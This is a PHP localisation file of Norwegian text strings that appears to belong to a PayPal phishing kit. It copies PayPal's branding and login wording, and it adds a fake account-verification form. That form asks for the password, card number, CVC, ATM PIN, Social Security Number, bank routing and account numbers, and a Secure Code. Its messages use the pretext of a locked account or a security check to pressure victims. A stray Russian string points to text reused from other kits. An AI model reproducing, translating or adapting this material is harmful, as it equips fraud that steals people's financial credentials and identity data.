<?php  

$confirmbutton = "bekrefte";
$confirmyourinfo = "Du må bekrefte dine opplysninger for å kunne løse dette problemet og få tilgang til kontoen din";
$unabletoload = "Midlertidig ute av stand til å laste kontoen din.";

$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Alle rettigheter reservert.";
$wrong = "Noe informasjon du skrev inn er ikke riktig.";
$titlerr = "Feil: Logg inn ";
$confirm = "Bekreft Account Bruk den slik du vil";
$topp = "Din sikkerhet er vår høyeste prioritet";
$secondarycred = "Sekundær kredittkort (valgfritt)";
$primarycred = "Primær kredittkort";
$thiscardis = "Dette kortet er VBV / MSC";

$page="no_NO"; 
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = false;
$section_row_fluid_panel_blue_reverseLink = true;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$country_selector = "country norway";
$top_title = "Betal, overfør og ta imot penger på nettet – PayPal Norge";
$small_with_helper_input_0 = "Du må skrive inn en gyldig e-postadresse";
$small_with_helper_input_1 = "Du må oppgi et passord";
$login_email_input_0 = "E-postadresse";
$passwordRecovery1_a_0 = "Glemt e-postadressen din?";
$login_password_input_0 = "Passord";
$passwordRecovery2_a_0 = "Glemt passordet?";
$login_button_a_0 = "Logg på";
$signup_button_a_0 = "Opprett konto";
$header_buy_a_0 = "Kjøp";
$header_sell_a_0 = "Selg";
$header_send_a_0 = "Overfør";
$header_business_a_0 = "Bedrift";
$signup_button_inner_a_0 = "Opprett konto";
$hero_h1_0 = "Trygg og enkel betaling.";
$SignUp_consumer_hero_input_0 = "Зарегистрироваться";
$signup_subline_p_0 = "Er du bedriftseier? Opprett en bedriftskonto";
$icon_help_a_0 = "Hjelp";
$icon_contact_a_0 = "Kontakt oss";
$_large_h2_n1_0 = "Raskt og enkelt.";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Det er enkelt å ta imot kort.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0 = "Overfør penger til hvem du vil.";
$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1 = "Raske penger.";
$contentPara_p_n1_0 = "Millioner av kunder verden over bruker PayPal av én eneste grunn: Det er enkelt. Du må bare skrive inn e-postadressen og passordet ditt for å bekrefte betalinger. Det går mye raskere enn å grave frem lommeboken og kortet! ";
$contentPara_p_row_fluid_panel_blue_reverseLink_0 = "Du kan overføre penger til andre raskt og enkelt, du trenger bare e-postadressen deres. ";
$contentPara_p_row_fluid_panel_blue_reverseLink_1 = "Det er enkelt å be om penger som noen skylder deg. Den andre personen mottar en vennlig invitasjon til å betale deg. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "Begynn å ta imot kortbetalinger – det er raskt og enkelt. Vi har ordnet alt, så du kan komme i gang allerede i dag. Lettere kunne det ikke ha vært. ";
$contentLink_a_n1_0 = "Betaling i nettbutikker";
$contentLink_a_n1_1 = "";
$contentLink_a_row_fluid_panel_blue_reverseLink_0 = "Overfør penger";
$contentLink_a_row_fluid_panel_blue_reverseLink_1 = "Be om penger";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Ta imot betalinger på nettstedet ditt ";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Send en e-faktura";
$closingHeadline_headline_large_p_0 = "Trygg og enkel betaling. ";
$btn_closing_cta_center_block_span4_a_0 = "Opprett en konto gratis";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Hjelp";
$footer_footer_main_secondaryLink_li[1] = "Kontakt oss";
$footer_footer_main_secondaryLink_li[2] = "Gebyrer";
$footer_footer_main_secondaryLink_li[3] = "Sikkerhet";
$footer_footer_main_secondaryLink_li[4] = "Funksjoner";
$footer_footer_main_secondaryLink_li[5] = "Butikker";
$footer_footer_main_secondaryLink_li[6] = "PayPal-appen";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Om PayPal";
$footer_footer_secondary_secondaryLink_li[1] = "Jobb";
$footer_footer_secondary_secondaryLink_li[2] = "eBay";
$footer_footer_secondary_secondaryLink_li[3] = "Developers";
$footer_footer_secondary_secondaryLink_li[4] = "Partnere";
$footer_footer_secondary_secondaryLink_li[5] = "Tilbakemelding";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999–".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Personvern";
$footer_footer_tertiary_secondaryLink_li[2] = "Brukeravtale";

$top_title2 = "Feil - Logg på Norge – PayPal";
$alert_alert_warning_div_0 = "Du må oppgi både e-postadressen og passordet. Prøv på nytt.";
$loginheadline_p_0 = "Logg på kontoen din";
$error_span_0 = "E-postadresse";
$error_span_1 = "Passord";
$btn_large_input_0 = "Logg på";
$pwrLinkoldflow_a_0 = "Har du glemt e-postadressen eller passordet ditt?";
$btn_btn_secondary_large_a_0 = "Opprett en konto gratis";
$headline_p_0 = "Trygg og sikker betaling.<SPAN class=headline-content>Velg et betalingskort eller en bankkonto. Uansett hva du velger, trenger du kun å skrive inn e-postadresse og passord når du betaler.</SPAN>";
$headline_p_1 = "Gratis, når du betaler i norske kroner.<SPAN class=headline-content>Det er gratis å opprette en PayPal-konto og det påløper ingen transaksjonsgebyrer når du bruker norske kroner, uansett hvordan du velger å betale.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Om";
$footer_li_footer_li[1] = "Kontotyper";
$footer_li_footer_li[2] = "Gebyrer";
$footer_li_footer_li[3] = "Personvern";
$footer_li_footer_li[4] = "Sikkerhet";
$footer_li_footer_li[5] = "Kontakt oss";
$footer_li_footer_li[6] = "Juridiske avtaler";
$footer_li_footer_li[7] = "Jobber";
$footer_li_footer_li[8] = "Massebetaling";
$footer_li_footer_li[9] = "Tilbakemelding";
$legal_p_0 = "Copyright © 1999–".$copyright." PayPal. Med enerett.";

$charset = "UTF-8";
$profupdate = "Profile Update - PayPal";
$processing = "Logge deg på ordentlig";
$opay = "logge inn - PayPal";
$ifno = "Hvis denne siden vises i mer enn fem sekunder,";
$clickhere = "Klikk her";
$reload = "for å laste.";
$logout = "Logg av";
$help = "Hjelp";
$s_center = "Sikkerhet og beskyttelse";
$myacc = "Min konto";
$over = "Oversikt";
$addfound = "Legg til midler";
$retirar = "Angrerett";
$banktf = "Overføring til bankkonto";
$history = "Historie";
$bsearch = "Grunnleggende søk";
$dhistory = "Last ned History";
$resolu = "Oppløsning Senter";
$opencase = "Vis åpne saker";
$guides = "Guider";
$prof = "Profil";
$addemail = "Legge til eller redigere e-post";
$addbank = "Legg til eller Endre bankkonto";
$addcard = "Legg til eller rediger kredittkort";
$addadr = "Legg til eller Rediger Postadresse";
$sendmoney = "Send penger";
$reqmoney = "Be om penger";
$mservices = "Merchant Services";
$autools = "Auksjonsverktøy";
$stra = "Sikker Transaksjons";
$puf = "Profil Update";
$pip = "Personlig informasjon Profile";
$acu = "Skriv inn din informasjon så nøyaktig som mulig.";
$accu = "Pass på at du skriver inn informasjon nøyaktig, og i henhold til formater som kreves.";
$filla = "Fyll ut alle de nødvendige feltene.";
$rfield = "Obligatorisk felt";
$ffPrenom = "Fornavn";
$ffNom = "Etternavn";
$dateness = "Fødselsdato";
$month = "Måned";
$day = "Dag"; 
$year = "År";
$adr1 = "Adresselinje 1";
$adr2 = "Adresse Linje 2";
$city = "By";
$state = "Stat";
$zip = "Postnummer";
$country = "Land";
$scountry = "- Velg land -";
$hpn = "Hjem telefonnummer";
$acpnum = "Dette nummeret vil bli brukt til å kontakte deg om sikkerhetstiltak og/eller andre spørsmål angående din PayPal-konto.";
$ccprof = "Kreditt/debetkort profil";
$damelacc = "Oppgi kort informasjon så nøyaktig som mulig.";
$damelacb = "For kortnummeret, taste inn tall Vennligst ingen bindestrek eller mellomrom.";
$Nomdutitulairedelacarte = "kortet Navn";
$ccnumbr = "Kortnummer";
$expbr = "Utløpsdato";
$cvv = "CVC Antall";
$hcvv = "Hjelp til å finne din CVC nummer";
$atmm = "Din ATM PIN";
$ssn = "Social Security Number";
$routing="Bank Routing Number";
$account="Bank Account Number";
$hrouting="Hjelp til å finne din Bank Routing Number";
$haccount="Hjelp til å finne din bankkontonummer";
$codepersonel="Secure Code";
$IDTYPE = "Velg type Id";
$Passport="Passport";
$Card_Identification="Kortet of Identification";
$Driving_License="Førerkort";
$for1 = "For din beskyttelse, vi verifisere kredittkortinformasjon.";
$for2 = "Prosessen tar normalt ca 30 sekunder, men det kan ta lengre tid i visse tider av døgnet. Vennligst klikk";
$for3 = "å oppdatere informasjonen.";
$spo = "Lagre profil";
$t1 = "Mer informasjon";
$t2 = "Om oss";
$t3 = "Tilbakemelding";
$t4 = "Avgifter";
$t5 = "Personvern";
$t6 = "Sikkerhetssenter";
$t7 = "Kontakt oss";
$t8 = "Juridiske avtaler";
$t9 = "Worldwide";
$t10 = "Jobber";
$t11 = "Merchant Services";
$t12 = "Vår blogg";
$t13 = "Labs";
$t14 = "Henvisninger";
$t15 = "Sidekart";
$t16 = "eBay";
$t17 = "Samfunn";
$fdic = "Informasjon om FDIC pass-through forsikring";
$myvar3 = "Fyll ut skjemaet nedenfor for å oppdatere din profil informasjon og gjenopprette kontoen tilgang.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("Skriv inn fornavn"
,"Ugyldig Fornavn" //--------
,"Skriv inn Etternavn"
,"Ugyldig Etternavn" //--------
,"Vennligst velg en gyldig fødselsmåned." //--------4
,"Vennligst velg en gyldig bursdag." //--------
,"Vennligst velg en gyldig fødselsåret." //--------
,"Skriv inn e-postadresse"
,"Ugyldig adresse" //--------8
,"Ugyldig adresse" //--------
,"Fyll inn navnet på byen din"
,"Vennligst skriv inn et gyldig by navn." //--------
,"Vennligst skriv inn et gyldig by navn." //--------12
,"Velg Land"
,"Vennligst skriv inn ditt postnummer"
,"Ugyldig postnummer." //--------15
,"Vennligst skriv inn ditt telefonnummer"
,"Tast bare antallet"
,"Vennligst skriv inn et gyldig telefonnummer" //--------
,"Vennligst skriv inn et gyldig navn på kortinnehaveren" //--------19
,"Kortnummer er i ugyldig format"  ////--------
,"Kredittkortnummer er ugyldig"  //--------
,""//--------22
,""//--------
,"Tast bare antallet"
,"Vennligst velg utløpsdato - Måned -"
,"Vennligst velg utløpsdato - år -"
,"Skriv inn CVV"
,"Vennligst skriv inn en gyldig Cvv/Cvv2 for kortet ditt."//--------
,"Ugyldig Cvv/Cvv2" //--------
,"Skriv inn e-ATM PIN"
,"Vennligst skriv inn en gyldig ATM PIN" //--------
,"Vennligst skriv inn en gyldig ATM PIN" //--------
,"Skriv inn Social Security Number"
,"Ugyldig personnummer."
,"Ugyldig personnummer."
,"The Social Security Number bare antallet"
,"Skriv inn e-Secure Code"
,"Ugyldig Secure Code");
$allcountry1 = "Hvor kommer du fra?";
$allcountry2 = "Vi er tilgjengelige i 193 land og håndterer 26 forskjellige valutaer. Betal, overfør og ta imot penger uten stress på tvers av grenser og språk. Vi er der for deg, uansett hvor du er. ";
$One_moment = "Et øyeblikk...";


$your_money = "Få mer ut av pengene dine";
$your_money_p = "PayPal-kontoen gir deg en tryggere, raskere og mer praktisk måte å betale på nettet og på mobilen. Lagre dine finansielle detaljer sikkert med oss da bruke din konto for å handle, overføre penger eller selge ting å tjene litt ekstra penger - alt i løpet av bare noen få klikk.";
$websites = "Handle på millioner av nettsteder";
$websites_p = "PayPal er tilgjengelig på millioner av nettsteder over hele verden. Så om du kjøper fra de største forhandlere eller de minste spesialister, kan du handle uten å dele dine detaljer og fart gjennom kassen. Og uansett hvilken enhet du bruker, vil din PayPal erfaring være like rask og praktisk.";
$Simply_secure = "Bare sikker";
$Simply_secure_p = "Sikkerhet er kjernen i alt vi gjør. Enten det er å beskytte dine finansielle detaljer eller kjøp, setter vi sikkerhet og trygghet først. Det er derfor vi bruker ledende kryptering og anti-svindel teknologi, hvorfor vi overvåke transaksjoner 24 timer i døgnet, og hvorfor vi kan hjelpe deg å få pengene dine tilbake hvis kjøpet ikke kommer eller ikke samsvarer beskrivelsen.";
$ex_date_info = "Vennligst gi oss din kort utløpsdato (MM/ÅÅÅÅ).";
$ex_date_empty = "Vennligst gi oss din kort utløpsdato.";
$ex_date_format = "Skriv inn en gyldig utløpsdato (MM/ÅÅÅÅ).";
$cardholder_info = "Bruk navn som vist på kortet ditt";
$card_info = "Skriv inn ditt kortnummer";
$card_format = "Kortnummeret er ugyldig";
$atm_info = "Skriv inn atm pin for dette kortet.";
$account_info = "Skriv inn din bankkontonummer";
$account_empty = "Skriv inn bankkontonummer for å verifisere kontoen din";
$account_format = "Skriv inn en gyldig bankkontonummer";
$routing_info = "Skriv inn din bank routing-nummer";
$routing_empty = "Skriv inn din bank routing-nummer for å verifisere kontoen din";
$routing_format = "Skriv inn en gyldig bank routing-nummer";
$first_name = "Fornavnet ditt";
$first_name_info = "Bruk din juridiske fornavn som vist på førerkort, folketrygdkort eller pass.";
$first_name_empty = "Vi trenger din juridiske fornavn for å verifisere kontoen din.";
$last_name = "Etternavnet ditt";
$last_name_info = "Bruk din juridiske etternavn som vist på førerkort, folketrygdkort eller pass.";
$last_name_empty = "Vi trenger din offisielle etternavn for å verifisere kontoen din.";
$Birth_date = "Fødselsdato";
$Birth_date_empty ="Vennligst gi oss din fødselsdato.";
$Birth_date_format = "Skriv inn en gyldig dato (DD/MM/ÅÅÅÅ).";
$Birth_date_info = "Vennligst gi oss din fødselsdato (DD/MM/ÅÅÅÅ).";
$Address1 = "Adresselinje 1";
$Address1_empty = "Vi trenger en gyldig adresse for å verifisere kontoen din.";
$Address1_info = "Vi kan ikke akseptere PO bokser eller forretningsadresser .";
$Address2 = "Adresselinje 2";
$City = "by";
$City_empty = "Vi trenger en by for å verifisere kontoen din.";
$Postcode = "postnummer";
$Postcode_empty = "Vi trenger et postnummer for å opprette en ny konto for deg.";
$Postcode_format = "Vennligst sjekk din postnummer for skrivefeil, ikke formatet ser ikke riktig ut.";
$fone = "Telefonnummeret ditt";
$fone_empty = "Vi trenger ditt telefonnummer for å verifisere kontoen din.";
$fone_format = "Vennligst sjekk telefonnummeret ditt for skrivefeil, ikke formatet ser ikke riktig ut.";
$fone_info = "Telefonnummeret ditt (vennligst bare bruke siffer)";
$verifyaccount = "Verifisere kontoen din";
$Ownb = "Eier en bedrift?";
$hh1 = "Dine sikre detaljer";
$hh2 = "Dine personopplysninger";
$pp1 = "Vi trenger dine gyldige sikre detaljer for å verifisere kontoen din.";
$pp2 = "Vi trenger litt informasjon om deg før vi kan bekrefte kontoen.";

$type1="Hjem";
$type2="Mobile";
$button_continue="Fortsett";
$button_validate="Bekreft";
?>